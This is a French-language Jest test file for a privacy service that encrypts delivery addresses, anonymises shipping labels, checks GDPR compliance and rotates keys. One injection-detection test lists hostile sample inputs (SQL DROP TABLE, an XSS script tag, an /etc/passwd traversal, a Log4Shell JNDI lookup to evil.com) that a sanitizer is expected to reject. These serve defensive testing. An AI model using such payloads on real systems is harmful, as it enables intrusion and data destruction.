
// Mocks pour la sécurité et crypto
jest.mock('crypto', () => ({
  randomBytes: jest.fn().mockReturnValue(Buffer.from('test-random-bytes')),
  createHash: jest.fn().mockReturnValue({
    update: jest.fn().mockReturnThis(),
    digest: jest.fn().mockReturnValue('test-hash')
  }),
  pbkdf2Sync: jest.fn().mockReturnValue(Buffer.from('test-derived-key')),
  createCipher: jest.fn().mockReturnValue({
    update: jest.fn().mockReturnValue('encrypted'),
    final: jest.fn().mockReturnValue('data')
  })
}));

jest.mock('bcrypt', () => ({
  hash: jest.fn().mockResolvedValue('hashed-password'),
  compare: jest.fn().mockResolvedValue(true)
}));


// Mock du service RGPD manquant
jest.mock('../../services/rgpdComplianceValidator', () => ({
  validateDataCompliance: jest.fn().mockResolvedValue({ valid: true }),
  encryptSensitiveData: jest.fn().mockReturnValue('encrypted_data'),
  checkConsentStatus: jest.fn().mockResolvedValue(true)
}));

/**
 * Tests pour le système de chiffrement et sécurité avancée
 * Couvre la protection des données personnelles et conformité RGPD
 */

const crypto = require('crypto');
const { PrivacyProtectionService } = require('../../services/privacyProtectionService');
const { RGPDComplianceValidator } = require('../../services/rgpdComplianceValidator');

jest.setTimeout(30000)
describe('Système de Chiffrement et Sécurité Avancée', () => {
  let privacyService;
  let rgpdValidator
beforeEach(() => {
    privacyService = new PrivacyProtectionService();
    rgpdValidator = new RGPDComplianceValidator();
  })
describe('Chiffrement des Adresses Personnelles', () => {
    test('doit chiffrer et déchiffrer une adresse complète', () => {
      const originalAddress = {
        firstName: 'Thomas',
        lastName: 'Dorel',
        street: '12 Rue des Acacias',
        city: 'Lyon',
        zipCode: '69001',
        country: 'France',
        phone: '06 12 34 56 78',
        email: 'thomas@example.com'
      };

      const encryptedData = privacyService.encryptPersonalData(originalAddress);
      const decryptedAddress = privacyService.decryptPersonalData(encryptedData);

      expect(encryptedData).not.toEqual(originalAddress);
      expect(encryptedData.iv).toBeDefined();
      expect(encryptedData.encryptedData).toBeDefined();
      expect(encryptedData.tag).toBeDefined();
      expect(decryptedAddress).toEqual(originalAddress);
    })
test('doit utiliser un chiffrement AES-256-GCM sécurisé', () => {
      const data = { test: 'sensitive data' };
      const encrypted = privacyService.encryptPersonalData(data);

      // Vérifier que l'IV est de 12 bytes (96 bits) pour GCM
      expect(Buffer.from(encrypted.iv, 'hex')).toHaveLength(12);
      
      // Vérifier que le tag d'authentification est présent
      expect(encrypted.tag).toBeDefined();
      expect(Buffer.from(encrypted.tag, 'hex')).toHaveLength(16);
    })
test('doit détecter les tentatives de modification des données chiffrées', () => {
      const data = { secret: 'important data' };
      const encrypted = privacyService.encryptPersonalData(data);
      
      // Modifier les données chiffrées
      encrypted.encryptedData = encrypted.encryptedData.slice(0, -2) + 'XX';
      
      expect(() => {
        privacyService.decryptPersonalData(encrypted);
      }).toThrow('Authentification failed');
    })
test('doit générer des clés de chiffrement uniques par utilisateur', () => {
      const user1Key = privacyService.generateUserEncryptionKey('user1');
      const user2Key = privacyService.generateUserEncryptionKey('user2');
      const user1KeyAgain = privacyService.generateUserEncryptionKey('user1');

      expect(user1Key).not.toEqual(user2Key);
      expect(user1Key).toEqual(user1KeyAgain); // Même utilisateur = même clé
    });
  })
describe('Anonymisation des Étiquettes', () => {
    test('doit créer des identifiants anonymes pour expéditeur et destinataire', () => {
      const tradeData = {
        tradeId: 'trade123',
        senderId: 'user1',
        recipientId: 'user2',
        senderName: 'Marie Dupont',
        recipientName: 'Thomas Dorel'
      };

      const anonymizedData = privacyService.createAnonymousLabeling(tradeData);

      expect(anonymizedData.senderAnonymousId).toMatch(/^CADOK-SENDER-[A-Z0-9]+$/);
      expect(anonymizedData.recipientAnonymousId).toMatch(/^CADOK-RECIPIENT-[A-Z0-9]+$/);
      expect(anonymizedData.senderAnonymousId).not.toContain('Marie');
      expect(anonymizedData.recipientAnonymousId).not.toContain('Thomas');
    })
test('doit créer une adresse de redirection sécurisée', () => {
      const realAddress = {
        name: 'Thomas Dorel',
        street: '12 Rue des Acacias',
        city: 'Lyon',
        zipCode: '69001'
      };

      const redirectionAddress = privacyService.createRedirectionAddress('trade123');

      expect(redirectionAddress.name).toBe('CADOK REDIRECTION');
      expect(redirectionAddress.attention).toMatch(/^CADOK-[A-Z0-9-]+$/);
      expect(redirectionAddress.street).toBe('15 Avenue des Trocs');
      expect(redirectionAddress.city).toBe('Paris');
      expect(redirectionAddress.zipCode).toBe('75001');
    })
test('doit mapper les identifiants anonymes aux vraies identités', () => {
      const mapping = privacyService.createIdentityMapping('trade123', 'user1', 'user2');

      expect(mapping.tradeId).toBe('trade123');
      expect(mapping.anonymousToReal).toBeDefined();
      expect(mapping.realToAnonymous).toBeDefined();
      expect(mapping.createdAt).toBeInstanceOf(Date);
      expect(mapping.expiresAt).toBeInstanceOf(Date);
    });
  })
describe('Validation RGPD', () => {
    test('doit valider la conformité RGPD d\'une livraison', () => {
      const deliveryData = {
        privacy: {
          level: 'FULL_ANONYMIZATION',
          method: 'REDIRECTION',
          encryptedMapping: true,
          anonymousIds: true
        },
        dataRetention: {
          personalDataRetentionDays: 30,
          logRetentionDays: 90
        },
        userConsent: {
          dataProcessing: true,
          thirdPartySharing: false,
          consentTimestamp: new Date()
        }
      };

      const compliance = rgpdValidator.validateDeliveryCompliance(deliveryData);

      expect(compliance.isCompliant).toBe(true);
      expect(compliance.score).toBeGreaterThan(80);
      expect(compliance.checks.dataMinimization).toBe(true);
      expect(compliance.checks.purposeLimitation).toBe(true);
      expect(compliance.checks.storageLimit).toBe(true);
    })
test('doit détecter les violations RGPD', () => {
      const nonCompliantData = {
        privacy: {
          level: 'NONE',
          method: 'DIRECT_SHARING'
        },
        dataRetention: {
          personalDataRetentionDays: 365 // Trop long
        },
        userConsent: {
          dataProcessing: false // Pas de consentement
        }
      };

      const compliance = rgpdValidator.validateDeliveryCompliance(nonCompliantData);

      expect(compliance.isCompliant).toBe(false);
      expect(compliance.violations).toContain('NO_PRIVACY_PROTECTION');
      expect(compliance.violations).toContain('EXCESSIVE_DATA_RETENTION');
      expect(compliance.violations).toContain('MISSING_CONSENT');
    })
test('doit générer un rapport de conformité détaillé', () => {
      const deliveryData = {
        privacy: { level: 'FULL_ANONYMIZATION' },
        dataRetention: { personalDataRetentionDays: 15 },
        userConsent: { dataProcessing: true }
      };

      const report = rgpdValidator.generateComplianceReport(deliveryData);

      expect(report.reportId).toBeDefined();
      expect(report.timestamp).toBeInstanceOf(Date);
      expect(report.complianceScore).toBeGreaterThan(0);
      expect(report.recommendations).toBeInstanceOf(Array);
      expect(report.dataProcessingBasis).toBeDefined();
    });
  })
describe('Audit Trail et Traçabilité', () => {
    test('doit enregistrer toutes les opérations sur les données personnelles', () => {
      const auditLogger = privacyService.getAuditLogger();
      
      auditLogger.logDataAccess({
        userId: 'user123',
        operation: 'ENCRYPT_ADDRESS',
        dataType: 'PERSONAL_ADDRESS',
        purpose: 'DELIVERY_LABEL_GENERATION',
        ipAddress: '192.168.1.100',
        userAgent: 'CADOK-App/1.0'
      });

      const logs = auditLogger.getLogs('user123');
      
      expect(logs).toHaveLength(1);
      expect(logs[0].operation).toBe('ENCRYPT_ADDRESS');
      expect(logs[0].timestamp).toBeInstanceOf(Date);
      expect(logs[0].purpose).toBe('DELIVERY_LABEL_GENERATION');
    })
test('doit maintenir un historique des consentements', () => {
      const consentManager = privacyService.getConsentManager();
      
      consentManager.recordConsent({
        userId: 'user123',
        consentType: 'DATA_PROCESSING_DELIVERY',
        granted: true,
        version: '2.1',
        ipAddress: '192.168.1.100'
      });

      const consentHistory = consentManager.getConsentHistory('user123');
      
      expect(consentHistory).toHaveLength(1);
      expect(consentHistory[0].granted).toBe(true);
      expect(consentHistory[0].version).toBe('2.1');
    })
test('doit permettre la révocation et suppression des données', () => {
      const dataManager = privacyService.getDataManager();
      
      // Simuler des données stockées
      dataManager.storeEncryptedData('user123', { encrypted: 'data' });
      
      // Demande de suppression
      const deletionResult = dataManager.deleteUserData('user123');
      
      expect(deletionResult.success).toBe(true);
      expect(deletionResult.deletedItems).toContain('encrypted_address');
      expect(deletionResult.deletedItems).toContain('audit_logs');
      
      // Vérifier que les données sont supprimées
      const userData = dataManager.getUserData('user123');
      expect(userData).toBeNull();
    });
  })
describe('Protection contre les Attaques', () => {
    test('doit résister aux attaques par timing', () => {
      const validCode = 'CADOK-ABC123-4567';
      const invalidCode = 'CADOK-XYZ999-1234';
      
      const startValid = process.hrtime.bigint();
      privacyService.validateRedirectionCode(validCode);
      const timeValid = process.hrtime.bigint() - startValid;
      
      const startInvalid = process.hrtime.bigint();
      privacyService.validateRedirectionCode(invalidCode);
      const timeInvalid = process.hrtime.bigint() - startInvalid;
      
      // La différence de temps ne doit pas révéler d'information
      const timeDifference = Number(timeValid - timeInvalid) / 1000000; // En ms
      expect(Math.abs(timeDifference)).toBeLessThan(5); // Moins de 5ms de différence
    })
test('doit implémenter une protection contre le bruteforce', () => {
      const rateLimiter = privacyService.getRateLimiter();
      
      // Simuler 10 tentatives rapides
      for (let i = 0; i < 10; i++) {
        rateLimiter.attempt('192.168.1.100', 'DECRYPT_ADDRESS');
      }
      
      const isBlocked = rateLimiter.isBlocked('192.168.1.100');
      expect(isBlocked).toBe(true);
      
      const timeUntilReset = rateLimiter.getTimeUntilReset('192.168.1.100');
      expect(timeUntilReset).toBeGreaterThan(0);
    })
test('doit détecter les tentatives d\'injection de code', () => {
      const sanitizer = privacyService.getInputSanitizer();
      
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ];
      
      maliciousInputs.forEach(input => {
        expect(() => {
          sanitizer.validateRedirectionCode(input);
        }).toThrow('Invalid characters detected');
      });
    });
  })
describe('Performance et Optimisation', () => {
    test('doit chiffrer/déchiffrer rapidement', async () => {
      const largeData = {
        addresses: Array(1000).fill().map((_, i) => ({
          name: `User ${i}`,
          street: `${i} Test Street`,
          city: 'TestCity',
          zipCode: '12345'
        }))
      };

      const startTime = process.hrtime.bigint();
      const encrypted = privacyService.encryptPersonalData(largeData);
      const decrypted = privacyService.decryptPersonalData(encrypted);
      const endTime = process.hrtime.bigint();
      
      const totalTime = Number(endTime - startTime) / 1000000; // En ms
      
      expect(decrypted).toEqual(largeData);
      expect(totalTime).toBeLessThan(1000); // Moins d'1 seconde
    })
test('doit mettre en cache les clés de chiffrement', () => {
      const keyManager = privacyService.getKeyManager();
      
      const startTime1 = process.hrtime.bigint();
      const key1 = keyManager.getUserKey('user123');
      const time1 = process.hrtime.bigint() - startTime1;
      
      const startTime2 = process.hrtime.bigint();
      const key2 = keyManager.getUserKey('user123'); // Deuxième appel
      const time2 = process.hrtime.bigint() - startTime2;
      
      expect(key1).toEqual(key2);
      expect(Number(time2)).toBeLessThan(Number(time1) / 10); // Cache 10x plus rapide
    });
  })
describe('Rotation des Clés', () => {
    test('doit permettre la rotation des clés de chiffrement', () => {
      const keyManager = privacyService.getKeyManager();
      
      const oldKey = keyManager.getCurrentKey();
      const rotationResult = keyManager.rotateKeys();
      const newKey = keyManager.getCurrentKey();
      
      expect(rotationResult.success).toBe(true);
      expect(newKey).not.toEqual(oldKey);
      expect(keyManager.getKeyHistory()).toContain(oldKey);
    })
test('doit pouvoir déchiffrer avec d\'anciennes clés', () => {
      const keyManager = privacyService.getKeyManager();
      const data = { test: 'data' };
      
      // Chiffrer avec la clé actuelle
      const encrypted = privacyService.encryptPersonalData(data);
      
      // Faire une rotation de clé
      keyManager.rotateKeys();
      
      // Doit toujours pouvoir déchiffrer
      const decrypted = privacyService.decryptPersonalData(encrypted);
      expect(decrypted).toEqual(data);
    });
  });
});
